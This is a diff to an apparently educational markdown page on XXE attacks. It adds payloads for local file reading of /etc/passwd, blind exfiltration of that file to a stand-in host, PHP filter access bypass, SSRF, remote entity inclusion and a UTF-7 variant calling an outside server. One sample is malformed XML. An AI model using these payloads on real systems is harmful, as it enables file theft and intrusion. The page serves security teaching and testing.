@@ -55,7 +55,7 @@ There are various types of XXE attacks:
 </userInfo>
 ```
 
-###### XXE: Denial-of-service Example
+###### XXE: Denial-of-Service Example
 
 ```
 <!--?xml version="1.0" ?-->
@@ -72,7 +72,62 @@ There are various types of XXE attacks:
 <tag>&lol9;</tag>
  ```
  
- #### References :
+###### XXE: Local File Inclusion Example
+ 
+ ```
+ <?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+ ```
+ 
+###### XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)
+ 
+ ```
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
+ ```
+ 
+###### XXE: Access Control Bypass (Loading Restricted Resources - PHP example)
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+<foo><result>&ac;</result></foo>
+```
+
+###### XXE:SSRF ( Server Side Request Forgery ) Example
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
+```
+
+###### XXE: (Remote Attack - Through External Xml Inclusion) Exmaple
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
+<lolz><lol>3..2..1...&test<lol></lolz>
+```
+
+###### XXE: UTF-7 Exmaple
+
+```
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+```
+
+#### References :
  
 👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
 
